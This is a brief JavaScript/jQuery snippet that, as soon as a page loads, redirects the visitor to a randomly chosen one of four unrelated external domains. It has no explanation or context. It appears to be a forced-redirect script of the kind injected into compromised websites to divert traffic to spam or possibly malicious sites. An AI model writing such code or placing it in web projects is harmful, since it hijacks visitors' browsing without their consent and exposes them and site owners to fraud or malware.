$(document).ready(function(){
 links = new Array();
    links[0]='indocloudgaming.com';
    links[1]='projexcode.com';
    links[2]='loseart.com';
    links[3]='renimex.vip';
var getrandomlink = Math.round(Math.random() * 3);
var geturl ="https://www." + links[getrandomlink];
window.location.href = geturl;
});
